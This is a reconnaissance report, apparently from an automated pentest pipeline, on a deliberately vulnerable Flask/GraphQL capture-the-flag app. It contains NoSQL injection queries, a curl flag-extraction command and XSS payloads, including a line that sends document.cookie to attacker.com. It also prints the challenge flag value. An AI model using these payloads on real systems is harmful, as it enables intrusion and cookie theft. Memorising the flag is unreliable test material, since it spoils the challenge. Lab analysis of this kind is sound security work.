# Reconnaissance Deliverable

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the Flask GraphQL application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls (spoiler: none exist) - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

---

## 1. Executive Summary

This Flask-based GraphQL application is a **CTF challenge** with intentionally critical security vulnerabilities. The application exposes a user management system with zero authentication, authorization, or input validation mechanisms. The target is a CTF flag stored in MongoDB, accessible through trivial NoSQL injection.

**Application Purpose:** User listing and search application with GraphQL API

**Core Technology Stack:**
- **Backend:** Python 3.8.17 (EOL), Flask 3.0.3, Flask-GraphQL 2.0.1, MongoEngine 0.28.2
- **Frontend:** Bootstrap 4.5.2, jQuery 3.5.1
- **Database:** MongoDB (latest, no authentication)
- **Deployment:** Docker Compose (Python 3.8-slim-buster + MongoDB containers)
- **Server:** Werkzeug 3.0.3 development server with debug mode enabled

**Primary User-Facing Components:**
1. Web interface at `/` displaying user list table
2. REST API wrapper at `/api/users` accepting GraphQL queries
3. GraphQL endpoint at `/graphql` with interactive GraphiQL IDE publicly accessible

**Critical Security Posture:**
- **ZERO authentication** - All endpoints publicly accessible
- **ZERO authorization** - Role field exists but never enforced
- **NoSQL injection** - User input directly unpacked into MongoDB queries
- **DOM-based XSS** - Three vulnerabilities in client-side rendering
- **Debug mode enabled** - Werkzeug debugger exposed in production
- **GraphiQL exposed** - Interactive API explorer aids reconnaissance
- **No security headers** - CSP, HSTS, X-Frame-Options all missing

---

## 2. Technology & Service Map

### Frontend
- **Framework:** Static HTML with jQuery 3.5.1
- **CSS Framework:** Bootstrap 4.5.2 (CDN: stackpath.bootstrapcdn.com)
- **JavaScript Libraries:** jQuery 3.5.1 (CDN: code.jquery.com)
- **Architecture:** Single-page application with AJAX-based data loading
- **Files:**
  - `/app/templates/index.html` - Main HTML template
  - `/app/static/js/scripts.js` - Client-side logic (42 lines)

### Backend
- **Language:** Python 3.8.17 (officially EOL as of October 2024)
- **Framework:** Flask 3.0.3
- **GraphQL:** Flask-GraphQL 2.0.1, Graphene 3.3
- **ORM:** MongoEngine 0.28.2
- **Server:** Werkzeug 3.0.3 development server
- **Key Dependencies:**
  - pymongo 4.7.3
  - Jinja2 3.1.4
  - itsdangerous 2.2.0 (unused - for session signing)
- **Application Files:**
  - `/app/app.py` (53 lines) - Main Flask application
  - `/app/schema.py` (31 lines) - GraphQL schema and resolver
  - `/app/models.py` (13 lines) - User document model
  - `/app/database.py` (6 lines) - MongoDB connection

### Infrastructure
- **Hosting:** Docker Compose orchestration
- **Containers:**
  - Web service: Python 3.8-slim-buster (exposed on 0.0.0.0:5003)
  - Database service: mongo:latest (internal only on port 27017)
- **Network:** Docker bridge network (no isolation between services)
- **Base OS:** Debian Buster (oldoldstable, EOL for standard support)
- **Installed but Unused:** PhantomJS 2.1.1 (abandoned since 2018)

### Database
- **Type:** MongoDB (latest)
- **Connection:** mongodb://mongo:27017/appdb (plaintext, no credentials)
- **Authentication:** DISABLED (no --auth flag, no root credentials)
- **Encryption:** None (plaintext storage, plaintext transit)
- **Collections:** User collection with 5 documents

### Identified Subdomains
Per pre-recon subfinder scan (not directly relevant to localhost:5003):
- autodiscover.regency.localhost
- mail02.regency.localhost
- mail.regency.localhost
- www.localhost
- fndlync01.5ninesdata.localhost
- server2.hunter.localhost
- tools.sonoma.edu.localhost
- exchvm.nwcnet.localhost
- naeu2.naeuinc.localhost
- mail03.regency.localhost
- owa.regency.localhost
- sbs.allsaintsschool.localhost
- autodiscover.localhost
- server02.counterintel.localhost
- mail.localhost
- mse-ca-mail.corp.mse.localhost

**Note:** These subdomains are from external scanning and do not apply to the target application at localhost:5003.

### Open Ports & Services
From nmap scan of localhost:
- **Port 5003/tcp** - Werkzeug httpd 3.0.3 (Python 3.8.17) - **TARGET APPLICATION**
  - HTTP title: "User List"
  - Network-accessible on 0.0.0.0:5003
- Port 80/tcp - Caddy httpd (not related to target)
- Port 443/tcp - ssl/https (not related to target)
- Port 3000/tcp - Node.js/Express (not related to target)
- Port 5000/tcp - Werkzeug/Python 3.9.24 - Different app (not related to target)
- Port 8080/tcp - Apache 2.4.54 - PHPAbUsers app (not related to target)

**Target Application Network Binding:**
- Host: 0.0.0.0 (all interfaces)
- Port: 5003
- Protocol: HTTP (no HTTPS/TLS)

---

## 3. Authentication & Session Management Flow

### Entry Points
**Status: NONE EXIST**

The application implements **ZERO authentication mechanisms**. There are no login endpoints, no credential validation, no session management, and no user identity tracking.

**Missing Entry Points:**
- No `/login` endpoint
- No `/register` endpoint
- No `/auth/*` routes
- No OAuth/SSO callbacks
- No password reset flows
- No logout functionality

### Mechanism
**Status: NOT IMPLEMENTED**

**User Model Analysis:**
- **File:** `/app/models.py`, lines 4-8
```python
class User(Document):
    username = StringField(required=True)
    email = StringField(required=True)
    is_admin = BooleanField(default=False)  # EXISTS BUT NEVER CHECKED
    flag = StringField()
```

**Critical Finding:** The User model contains NO password or authentication credential fields. Users exist in the database but have no way to authenticate.

**Session Configuration:**
- **File:** `/app/app.py`, line 8
- `app = Flask(__name__)` - Default configuration only
- **Missing:** `SECRET_KEY` configuration
- **Missing:** Session cookie configuration
- **Missing:** JWT token configuration
- **Missing:** Any authentication library imports

### Code Pointers
**Authentication Logic:** DOES NOT EXIST

**Files Examined:**
- `/app/app.py` (lines 1-53) - No authentication decorators, no before_request hooks, no session management
- `/app/schema.py` (lines 8-29) - GraphQL resolver has no authentication checks
- `/app/requirements.txt` - No authentication libraries (no Flask-Login, Flask-JWT-Extended, Flask-HTTPAuth)

**All Endpoints Are Public:**
```python
# app.py:20-22
@app.route('/')
def index():
    return render_template('index.html')  # NO @login_required

# app.py:24-38
@app.route('/api/users', methods=['POST'])
def get_users():  # NO authentication check
    query = request.json.get('query')
    response = schema.execute(query)
    return jsonify({"users": users})

# app.py:11-18
app.add_url_rule('/graphql',
    view_func=GraphQLView.as_view('graphql', schema=schema, graphiql=True))
    # NO get_context for auth injection
```

---

### 3.1 Role Assignment Process

**Role Determination:** Hardcoded at database initialization

**Process:**
- **File:** `/app/app.py`, lines 40-48
- Roles assigned in `reset_database()` function called at application startup
- 2 users assigned `is_admin=True` (admin, admin2)
- 3 users assigned `is_admin=False` (user1, user2, user3)

**Default Role:** `is_admin=False` (per BooleanField default in models.py:7)

**Role Upgrade Path:** NONE - roles are static and cannot be changed through the application

**Code Implementation:**
```python
# app.py:40-48
def reset_database():
    flag = os.getenv('FLAG', 'flag{this_is_a_fake_flag}')
    User.drop_collection()
    User(username="admin", email="admin@heytheregotrythis.com", is_admin=True).save()
    User(username="admin2", email="admin2@goodyoutriedsomethingelse.com", is_admin=True, flag=flag).save()
    User(username="user1", email="user1@heytheregotrythis.com", is_admin=False).save()
    User(username="user2", email="user2@heytheregotrythis.com", is_admin=False).save()
    User(username="user3", email="user3@heytheregotrythis.com", is_admin=False).save()
```

---

### 3.2 Privilege Storage & Validation

**Storage Location:** MongoDB User collection, field `is_admin` (boolean)

**Validation Points:** **NONE** - The `is_admin` field is never checked anywhere in the codebase

**Cache/Session Persistence:** N/A - No sessions exist

**Code Pointers:**
- **Role Definition:** `/app/models.py:7` - `is_admin = BooleanField(default=False)`
- **Role Assignment:** `/app/app.py:43-44` - Hardcoded in database seeding
- **Role Validation:** DOES NOT EXIST - No code checks `if user.is_admin` or similar

**Critical Finding:** The GraphQL resolver accepts an `is_admin` parameter (schema.py:6) but NEVER uses it for authorization:
```python
# schema.py:8-9
def resolve_users(self, info, search=None, options=None, dummy=None, is_admin=None):
    query = User.objects()  # NO check of is_admin parameter or requester role
```

---

### 3.3 Role Switching & Impersonation

**Impersonation Features:** NONE

**Role Switching:** NOT IMPLEMENTED

**Audit Trail:** NO LOGGING of any kind (except one print statement at app.py:36)

**Code Implementation:** N/A - feature does not exist

---

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints below are network-accessible through the target web application at http://localhost:5003.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|---------------------------|
| GET | `/` | anon | None | None | Renders HTML template displaying user list table. **File:** `/app/app.py:20-22`. Returns `templates/index.html` with Bootstrap UI. |
| POST | `/api/users` | anon | `search` (JSON MongoDB filter), `options` (JSON pagination) | None | REST wrapper for GraphQL execution. Accepts JSON body with `query` field containing GraphQL query string. **File:** `/app/app.py:24-38`. **VULNERABLE** to NoSQL injection via search parameter. |
| GET/POST | `/graphql` | anon | `search`, `options`, `dummy`, `is_admin` | None | GraphQL endpoint with **GraphiQL IDE enabled** (`graphiql=True`). Provides interactive API explorer. **File:** `/app/app.py:11-18`. Executes resolver at `/app/schema.py:8-29`. **CRITICAL:** GraphiQL exposes schema introspection. |

### GraphQL Query Parameters (All Endpoints Accept These via GraphQL Queries)

| Parameter Name | Type | Purpose | Validation | Vulnerability |
|----------------|------|---------|------------|---------------|
| `search` | String (JSON) | MongoDB filter criteria | **NONE** - JSON syntax only | **CRITICAL NoSQL Injection** - User input unpacked directly into `query.filter(**search_criteria)` at schema.py:14 |
| `options` | String (JSON) | Pagination (skip, limit) | **NONE** - No bounds checking | **MEDIUM** - Can specify arbitrary skip/limit values for DoS |
| `dummy` | String | Unknown/unused | None | Dead code - parameter accepted but never processed |
| `is_admin` | Boolean | Role filter (intended) | None | **CRITICAL** - Accepted but never enforced for authorization, only usable in search filter to query admin users |

### Detailed Endpoint Analysis

**Endpoint 1: GET /**
- **Returns:** HTML page with user list table
- **Client-Side Behavior:** Automatically makes AJAX POST to `/api/users` on page load
- **Default Query:** `{"email": {"$regex": ".*@heytheregotrythis.com"}, "is_admin": false}`
- **XSS Risk:** Client-side rendering without sanitization (scripts.js:27-30)

**Endpoint 2: POST /api/users**
- **Request Body:**
  ```json
  {
    "query": "{ users(search: \"{...}\") { username email flag } }"
  }
  ```
- **Response:** `{"users": [...]}`
- **Error Handling:** Returns 400 if GraphQL execution fails
- **Logging:** Prints user data to stdout (app.py:36)

**Endpoint 3: GET/POST /graphql**
- **GraphiQL URL:** http://localhost:5003/graphql
- **Schema Introspection:** Enabled (allows `__schema` queries)
- **Query Types:** Only `users` query available (no mutations)
- **Field Types:** UserType exposes `username`, `email`, `flag` fields

---

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through the target web application's network interface are included.

### URL Parameters
- **GraphQL GET requests:** `?query=...` parameter to `/graphql` endpoint
  - Example: `/graphql?query={users{username}}`
  - **Validation:** GraphQL syntax validation only

### POST Body Fields (JSON)

**Endpoint: /api/users**
- `query` (string, required) - GraphQL query string
  - **File:** `/app/app.py:26`
  - **Validation:** None before execution
  - **Dangerous Sink:** Passed to `schema.execute(query)` at line 27

**Endpoint: /graphql (POST)**
- `query` (string) - GraphQL query
- `variables` (object, optional) - GraphQL variables
- `operationName` (string, optional) - Named operation

**GraphQL Query Arguments (within query string):**
- `search` (string) - JSON MongoDB filter
  - **File:** `/app/schema.py:13-14`
  - **Validation:** JSON syntax check only (json.loads)
  - **Dangerous Sink:** `query.filter(**search_criteria)` - **NoSQL INJECTION**
  - **Example Attack:** `"{\"is_admin\": true}"` or `"{\"flag\": {\"$ne\": null}}"`
  
- `options` (string) - JSON pagination options
  - **File:** `/app/schema.py:21-25`
  - **Validation:** None (no type/bounds checking)
  - **Dangerous Sink:** `query.skip()` and `query.limit()` methods
  - **Example Attack:** `"{\"skip\": 0, \"limit\": 999999}"`

- `dummy` (string) - Unused parameter
  - **File:** `/app/schema.py:8`
  - **Validation:** None
  - **Dangerous Sink:** None (dead code)

- `is_admin` (boolean) - Unused for authorization
  - **File:** `/app/schema.py:8`
  - **Validation:** GraphQL boolean type check
  - **Dangerous Sink:** None (not used in resolver logic)

### HTTP Headers
**None Processed** - The application does not read or validate any HTTP headers for authentication or input.

**Headers Ignored:**
- `Authorization` - Not checked
- `X-API-Key` - Not checked
- `X-Auth-Token` - Not checked
- `User-Agent` - Not processed
- `X-Forwarded-For` - Not processed
- `Referer` - Not processed

### Cookie Values
**None Used** - The application sets no cookies and reads no cookies.

**Missing Cookie Usage:**
- No session cookies
- No CSRF tokens
- No authentication tokens
- No tracking cookies

### Client-Side Input (Frontend JavaScript)

**File:** `/app/static/js/scripts.js`

**Input Vector: User Data Rendering (XSS Sinks)**
- `user.username` - Lines 27, 30
  - **Validation:** None
  - **Dangerous Sink:** jQuery DOM insertion via template literals
  - **Attack:** Stored XSS if username contains `<script>` or HTML
  
- `user.email` - Line 28
  - **Validation:** None
  - **Dangerous Sink:** jQuery DOM insertion
  - **Attack:** Stored XSS if email contains malicious HTML

- `data-username` attribute - Line 30
  - **Validation:** None
  - **Dangerous Sink:** HTML attribute injection
  - **Attack:** Attribute breakout to inject event handlers

**Input Vector: Search Query Construction**
- Line 42: Constructs GraphQL query with default search criteria
- **Validation:** Basic quote escaping (`.replace(/"/g, '\\"')`)
- **Issue:** Client-side only, easily bypassed by direct API calls

### Environment Variables

**FLAG Environment Variable**
- **Source:** `.env` file or Docker build arg
- **Loaded at:** `/app/app.py:41`
- **Validation:** None
- **Dangerous Sink:** Stored directly in database at line 44

**MONGO_URI Environment Variable**
- **Source:** Environment variable
- **Loaded at:** `/app/database.py:5`
- **Default:** `mongodb://mongo:27017/appdb`
- **Validation:** None

---

## 6. Network & Interaction Map

**Network Surface Focus:** Only components that are part of the deployed, network-accessible infrastructure are mapped.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| ExternalUser | ExternAsset | Internet | Browser | None | Unauthenticated users accessing application |
| FlaskWebApp | Service | App | Python 3.8/Flask 3.0.3 | PII, CTF Flag | Main application backend on port 5003 |
| MongoDB | DataStore | Data | MongoDB latest | PII, CTF Flag | Database with no authentication |
| DockerHost | AdminPlane | Admin | Docker Compose | Containers | Orchestration layer |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| FlaskWebApp | Hosts: `http://localhost:5003`; Endpoints: `/`, `/api/users`, `/graphql`; Auth: None; Dependencies: MongoDB; Debug: Enabled; User: root (container) |
| MongoDB | Engine: MongoDB latest; Exposure: Internal Docker network only; Consumers: FlaskWebApp; Credentials: None (--auth disabled); Port: 27017; Encryption: None |
| DockerHost | Orchestration: docker-compose.yml; Containers: web (Python 3.8-slim-buster), mongo (mongo:latest); Network: Bridge (default); Volumes: mongo-data |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| ExternalUser → FlaskWebApp | HTTP | :5003 / | None | Public |
| ExternalUser → FlaskWebApp | HTTP | :5003 /api/users | None | PII, CTF Flag |
| ExternalUser → FlaskWebApp | HTTP | :5003 /graphql | None | PII, CTF Flag |
| FlaskWebApp → MongoDB | TCP | :27017 | None (no auth) | PII, CTF Flag |
| DockerHost → FlaskWebApp | Docker API | Container mgmt | host-access | Containers |
| DockerHost → MongoDB | Docker API | Container mgmt | host-access | Containers |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | Auth | **NO GUARDS EXIST** - All endpoints are publicly accessible without authentication or authorization |
| graphql-syntax | Protocol | GraphQL queries must be syntactically valid (enforced by GraphQL library) |
| json-syntax | Protocol | JSON parameters must be valid JSON (enforced by json.loads, errors silently suppressed) |
| host-access | Env | Docker host administrative access required for container operations |

**Critical Finding:** This application has ZERO authorization guards. The intended guards (based on the `is_admin` field) would have been:

| Intended Guard | Category | Statement (NOT IMPLEMENTED) |
|----------------|----------|----------------------------|
| auth:user | Auth | Should require valid user session or bearer token for authentication (NOT IMPLEMENTED) |
| auth:admin | Auth | Should require valid admin session with `is_admin=true` (NOT IMPLEMENTED) |
| ownership:user | ObjectOwnership | Should verify requesting user owns the target object (NOT IMPLEMENTED) |
| field:flag | Authorization | Should restrict `flag` field to admin users only (NOT IMPLEMENTED) |

---

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anon | 0 | Global | No authentication required - default state for all requesters |
| user (intended) | 1 | Global | `is_admin=False` in database, but **NEVER ENFORCED** in code |
| admin (intended) | 5 | Global | `is_admin=True` in database, but **NEVER ENFORCED** in code |

**Critical Finding:** While the data model defines two privilege levels (regular user vs admin), **NO CODE ENFORCES THESE DISTINCTIONS**. All requesters have equivalent access regardless of authentication status or role.

**Database Role Distribution:**
- 2 admin users: `admin`, `admin2` (is_admin=True)
- 3 regular users: `user1`, `user2`, `user3` (is_admin=False)
- CTF flag stored only in `admin2` user document

### 7.2 Privilege Lattice

**Intended Hierarchy (NOT ENFORCED):**
```
anon → user → admin
(0)     (1)    (5)
```

**Actual Hierarchy:**
```
ALL USERS = MAXIMUM PRIVILEGE (Level 10)
(No authentication, no authorization, no restrictions)
```

**Note:** There are no role switching mechanisms, impersonation features, or sudo mode. The role field exists in the database but has zero impact on access control.

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anon | `/` | ALL routes: `/`, `/api/users`, `/graphql` | None |
| user (intended) | `/` | SHOULD be limited, but all routes accessible | None (auth not implemented) |
| admin (intended) | `/` | SHOULD have full access, but equivalent to anon | None (auth not implemented) |

**Critical Finding:** All roles (including unauthenticated anonymous users) can access all routes without any restrictions.

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anon | None | None | N/A (no user identity) |
| user | None (SHOULD have `requireAuth()`) | None (SHOULD check `is_admin=False`) | MongoDB User.is_admin field |
| admin | None (SHOULD have `requireAuth()` + `requireAdmin()`) | None (SHOULD check `is_admin=True`) | MongoDB User.is_admin field |

**Code Evidence:**

**No Middleware:**
```python
# app.py - NO @app.before_request handlers
# app.py - NO authentication decorators on any route
```

**No Permission Checks:**
```python
# schema.py:8-9
def resolve_users(self, info, search=None, options=None, dummy=None, is_admin=None):
    query = User.objects()  # ← NO if not current_user.is_authenticated
                             # ← NO if not current_user.is_admin
    # Direct database query without authorization
```

---

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

**Ranked list of endpoints with object identifiers that could allow access to other users' resources.**

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|---------------------|-----------|-------------|
| **CRITICAL** | `/graphql` with `search` parameter | MongoDB filter with username/email | user_data | **Any user can query other users' data** via `search: "{\"username\": \"admin2\"}"` |
| **CRITICAL** | `/api/users` with GraphQL query | MongoDB filter in search argument | user_data, CTF flag | **Direct access to flag** via NoSQL injection: `search: "{\"flag\": {\"$ne\": null}}"` |
| **HIGH** | `/graphql` schema introspection | N/A (schema discovery) | metadata | **GraphiQL interface reveals all fields** including `flag` field through `__schema` queries |
| **HIGH** | `/graphql` field selection | Field names in query | user_data, CTF flag | **No field-level authorization** - any user can request `flag` field |

**Exploitation Example (Horizontal Escalation):**
```graphql
# User accessing another user's data:
query {
  users(search: "{\"username\": \"admin2\"}") {
    username
    email
    flag  # ← Access to admin's flag without authentication
  }
}
```

### 8.2 Vertical Privilege Escalation Candidates

**List of endpoints that require higher privileges, organized by target role.**

| Target Role | Endpoint Pattern | Functionality | Risk Level |
|-------------|------------------|---------------|------------|
| admin | `/graphql` - `users` query with `flag` field | **CTF flag retrieval** - SHOULD require admin role | **CRITICAL** |
| admin | `/graphql` - filter by `is_admin=true` | **Admin user enumeration** - SHOULD require admin role | **CRITICAL** |
| admin | `/api/users` - GraphQL with admin data | **Admin data access** - SHOULD require admin role | **CRITICAL** |
| admin | `/graphql` - GraphiQL interface | **API exploration** - SHOULD be disabled in production | **HIGH** |

**Note:** Since NO authentication exists, vertical privilege escalation is trivial - anonymous users already have admin-equivalent access.

**Exploitation Example (Vertical Escalation):**
```bash
# Anonymous user extracting admin flag (single request):
curl -X POST http://localhost:5003/api/users \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"{\\\"is_admin\\\": true}\") { username email flag } }"}'

# Response includes CTF flag without any authentication
```

### 8.3 Context-Based Authorization Candidates

**Status:** NOT APPLICABLE

This application has no multi-step workflows, state management, or context-dependent operations. All operations are single-request queries with no prerequisite steps.

**No Context-Based Vulnerabilities Found:**
- No checkout/payment flows
- No multi-step forms
- No wizard-style processes
- No password reset flows
- No state transitions requiring validation

---

## 9. Injection Sources (Command Injection and SQL Injection)

**TASK AGENT COORDINATION:** A dedicated Injection Source Tracer Agent identified these sources.

**Network Surface Focus:** Only injection sources reachable through the target web application's network interface are included.

### Command Injection Sources

**STATUS: NONE FOUND**

**Analysis Performed:** Comprehensive search for command injection sinks:
- ✓ No `subprocess` module usage (run, call, Popen, check_output, etc.)
- ✓ No `os.system()` calls
- ✓ No `os.popen()` calls
- ✓ No `os.exec*()` family functions
- ✓ No `eval()`, `exec()`, or `compile()` with user input
- ✓ No shell utilities invoked (curl, wget, etc.)

**Conclusion:** This application performs NO external command execution and is architecturally immune to command injection.

**Note:** PhantomJS is installed in the Docker image (`/app/Dockerfile:8-12`) but is NEVER imported or executed from application code.

---

### NoSQL Injection Sources

**STATUS: 1 CRITICAL SOURCE FOUND**

#### NoSQL Injection Source #1: GraphQL Search Parameter

**Complete Data Flow Path:**
1. **Entry Point:** HTTP POST to `/api/users` or `/graphql`
2. **User Input:** GraphQL query parameter `search` (String type)
3. **Flow:**
   - `/app/app.py:26` - Receives query from `request.json.get('query')`
   - `/app/app.py:27` - Executes via `schema.execute(query)`
   - `/app/schema.py:8-9` - GraphQL resolver receives `search` parameter
   - `/app/schema.py:13` - Deserializes: `search_criteria = json.loads(search)`
   - **INJECTION POINT:** `/app/schema.py:14` - `query.filter(**search_criteria)`

**Vulnerable Code:**
```python
# File: /app/schema.py, lines 11-16
if search:
    try:
        search_criteria = json.loads(search)  # Only validates JSON syntax
        query = query.filter(**search_criteria)  # ← NOSQL INJECTION
    except json.JSONDecodeError:
        pass  # Silent failure
```

**Validation Applied:** **NONE**
- Only JSON syntax validation (json.loads)
- No whitelist of allowed field names
- No blacklist of MongoDB operators
- No type validation
- Errors silently suppressed

**Dangerous Sink:** MongoDB MongoEngine `.filter(**kwargs)` method
- Accepts arbitrary MongoDB query operators
- User can inject: `$regex`, `$ne`, `$gt`, `$lt`, `$in`, `$nin`, `$where`, `$or`, etc.

**Attack Vectors:**

1. **Admin User Enumeration:**
```graphql
query {
  users(search: "{\"is_admin\": true}") {
    username
    email
    flag
  }
}
```

2. **Flag Extraction:**
```graphql
query {
  users(search: "{\"flag\": {\"$ne\": null}}") {
    username
    flag
  }
}
```

3. **Regex-Based Blind Injection:**
```graphql
query {
  users(search: "{\"email\": {\"$regex\": \"^admin\", \"$options\": \"i\"}}") {
    username
    email
  }
}
```

4. **Boolean Blind Injection:**
```graphql
query {
  users(search: "{\"is_admin\": {\"$ne\": false}}") {
    username
  }
}
```

**Impact:** Complete database enumeration, unauthorized access to CTF flag, admin user discovery.

---

#### NoSQL Injection Source #2: GraphQL Options Parameter (Lower Severity)

**Complete Data Flow Path:**
1. **Entry Point:** Same as Source #1
2. **User Input:** GraphQL query parameter `options` (String type)
3. **Flow:**
   - Same entry as Source #1
   - `/app/schema.py:21` - Deserializes: `options_criteria = json.loads(options)`
   - **LIMITED INJECTION:** `/app/schema.py:23-25` - `query.skip()` and `query.limit()`

**Vulnerable Code:**
```python
# File: /app/schema.py, lines 19-27
if options:
    try:
        options_criteria = json.loads(options)
        if 'skip' in options_criteria:
            query = query.skip(options_criteria['skip'])  # No type validation
        if 'limit' in options_criteria:
            query = query.limit(options_criteria['limit'])  # No bounds checking
    except json.JSONDecodeError:
        pass
```

**Validation Applied:** **NONE**
- No type validation (could be strings, negatives, etc.)
- No bounds checking on skip/limit values
- Could specify extremely large values for DoS

**Impact:** Limited to pagination manipulation, potential DoS via resource exhaustion.

---

### SQL Injection Sources

**STATUS: NOT APPLICABLE**

This application uses MongoDB (NoSQL), not SQL databases. There are no SQL queries, no ORM queries to relational databases, and no SQL injection attack surface.

---

## 10. XSS Sinks and Render Contexts

**Three DOM-based XSS vulnerabilities exist in client-side JavaScript.**

### XSS Sink #1: Username Field - HTML Body Context

**Location:** `/app/static/js/scripts.js:27`

**Vulnerable Code:**
```javascript
const row = $(`
    <tr>
        <td>${user.username}</td>  // ← XSS SINK
        <td>${user.email}</td>
        <td><button class="btn btn-sm btn-primary view-details" data-username="${user.username}">View</button></td>
    </tr>
`);
$('#userTableBody').append(row);
```

**Render Context:** HTML Body Context
- Template literal interpolates `user.username` directly into `<td>` element
- jQuery `.append()` parses string as HTML
- No sanitization or encoding

**Attack Vector:** Stored XSS via MongoDB data poisoning
- Attacker injects malicious username into database
- When page loads, JavaScript renders unsanitized username
- Malicious payload executes in victim browsers

**Exploitation Complexity:** LOW
- No CSP headers to block inline scripts
- No output encoding
- Direct DOM insertion

**Example Payload:**
```
Username: <img src=x onerror=alert('XSS')>
```

---

### XSS Sink #2: Email Field - HTML Body Context

**Location:** `/app/static/js/scripts.js:28`

**Vulnerable Code:**
```javascript
<td>${user.email}</td>  // ← XSS SINK
```

**Render Context:** HTML Body Context (identical to Sink #1)

**Attack Vector:** Stored XSS via database poisoning

**Example Payload:**
```
Email: test@example.com"><script>fetch('https://attacker.com/steal?data='+document.cookie)</script>
```

---

### XSS Sink #3: data-username Attribute - HTML Attribute Context

**Location:** `/app/static/js/scripts.js:30`

**Vulnerable Code:**
```javascript
<button class="btn btn-sm btn-primary view-details" data-username="${user.username}">View</button>
```

**Render Context:** HTML Attribute Context
- Username interpolated into `data-username` attribute
- Attacker can break out of attribute and inject event handlers

**Attack Vector:** Attribute injection

**Example Payload:**
```
Username: " onclick="alert('XSS')" x="
Rendered: <button ... data-username="" onclick="alert('XSS')" x="">View</button>
```

**Alternative (Immediate Execution):**
```
Username: " autofocus onfocus="alert(document.domain)" x="
```

---

### Server-Side Template Injection (SSTI)

**STATUS: NOT VULNERABLE**

**Analysis:** The single Jinja2 template (`/app/templates/index.html`) contains only safe `url_for()` function calls with no user input. Jinja2 autoescaping is enabled by default in Flask 3.x.

**No SSTI sinks found:**
- No `render_template_string()` usage
- No `|safe` filter usage
- No user input in templates
- Autoescaping enabled

---

## 11. SSRF Sinks

**COMPREHENSIVE ANALYSIS RESULT: NO SSRF VULNERABILITIES FOUND**

This application is architecturally immune to Server-Side Request Forgery (SSRF) attacks. The application performs ZERO outbound HTTP requests and contains no functionality that opens external resources.

### Analysis Performed

**HTTP(S) Clients:** ✓ None found
- No `requests` library usage
- No `urllib` usage
- No `httpx`, `aiohttp`, or `curl` usage

**Raw Socket APIs:** ✓ None found
- No `socket.connect()` usage
- MongoDB connection is static (not user-controllable)

**URL Opening Functions:** ✓ None found
- No `urlopen()` or `urlretrieve()`
- No remote file access

**Subprocess Execution:** ✓ None found (also eliminates command injection)

**Headless Browsers:** ✓ Not used
- PhantomJS installed but NEVER imported or executed

**Media Processors:** ✓ None found

**Webhook/Callback Handlers:** ✓ None found

**Architecture Analysis:**
- Inbound-only network model (receives HTTP, queries internal MongoDB)
- No URL parameters accepted
- No external service integrations
- Static MongoDB connection string (not user-controllable)

**Conclusion:** SSRF attack surface = ZERO

---

## 12. Additional Security Findings

### Debug Mode Enabled in Production

**File:** `/app/app.py:53`
```python
app.run(debug=True, host='0.0.0.0', port=5003)
```

**Impact:**
- Werkzeug interactive debugger exposed on errors
- Detailed stack traces leak internal paths
- Automatic code reloading enabled
- RCE potential via debugger PIN bypass

### GraphiQL Interface Publicly Accessible

**File:** `/app/app.py:16`
```python
graphiql=True  # Interactive GraphQL IDE enabled
```

**Impact:**
- Interactive schema exploration for attackers
- Built-in query testing environment
- Auto-completion aids exploit development
- Documentation generator for reconnaissance

### No Security Headers

**Missing Headers:**
- Content-Security-Policy (CSP)
- Strict-Transport-Security (HSTS)
- X-Frame-Options
- X-Content-Type-Options
- Referrer-Policy

**Impact:**
- XSS exploitation easier (no CSP)
- Clickjacking possible (no X-Frame-Options)
- MIME confusion attacks possible

### MongoDB Without Authentication

**File:** `/app/database.py:5-6`
```python
MONGO_URI = os.getenv('MONGO_URI', 'mongodb://mongo:27017/appdb')
connect(host=MONGO_URI)
```

**Docker Config:** No `--auth` flag, no credentials

**Impact:**
- Any process on Docker network can access database
- No role-based access control (RBAC)
- Plaintext protocol (no TLS)

### Secrets in Version Control

**File:** `.env:1`
```
FLAG="flag{0cc66709-2724-423d-bd08-7351e6bd8955}"
```

**Impact:**
- Flag visible in git history
- Environment variables in Dockerfile (visible via `docker inspect`)
- No secrets rotation

### Python 3.8 EOL

**Impact:**
- No security patches for newly discovered vulnerabilities
- Outdated base OS (Debian Buster EOL)

---

## 13. Summary for Downstream Specialists

### For Injection Analysis Specialist
- **1 Critical NoSQL injection** in GraphQL `search` parameter (schema.py:14)
- User input unpacked directly into MongoDB query: `query.filter(**search_criteria)`
- No command injection attack surface
- See Section 9 for complete data flow analysis

### For XSS Analysis Specialist
